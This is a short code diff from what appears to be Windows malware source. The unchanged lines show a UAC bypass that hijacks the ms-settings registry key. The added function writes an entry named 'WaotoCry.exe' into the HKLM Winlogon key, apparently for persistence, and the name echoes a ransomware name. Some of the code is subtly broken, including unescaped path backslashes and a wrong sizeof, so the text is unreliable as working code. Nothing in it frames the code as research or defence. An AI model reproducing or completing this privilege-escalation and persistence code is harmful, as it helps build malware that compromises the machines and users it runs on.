@@ -14,11 +14,22 @@ int add_double_data(char new_process_path) {
 		RegSetValueExW(key, L"DelegateExecute", 0, REG_SZ, (BYTE*)"", sizeof(""));
 		BypassUAC();
 		Sleep(100);
-		RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");					
+		RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
 		break;
 	}
 	return 1;
 }
+
+int increase(char start_process) {
+	HKEY A_Key;
+	char login_pth[] = "\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
+	::RegOpenKeyEx(HKEY_LOCAL_MACHINE, login_pth, 0, KEY_WRITE, &A_Key);
+	::RegSetValueExW(A_Key, L"WaotoCry.exe", 0, REG_SZ, (BYTE*)start_process, sizeof(start_process));
+	::RegCloseKey(A_Key);
+}
+
+
+
 
 int BypassUAC() {
 	PROCESS_INFORMATION pi = { 0 };
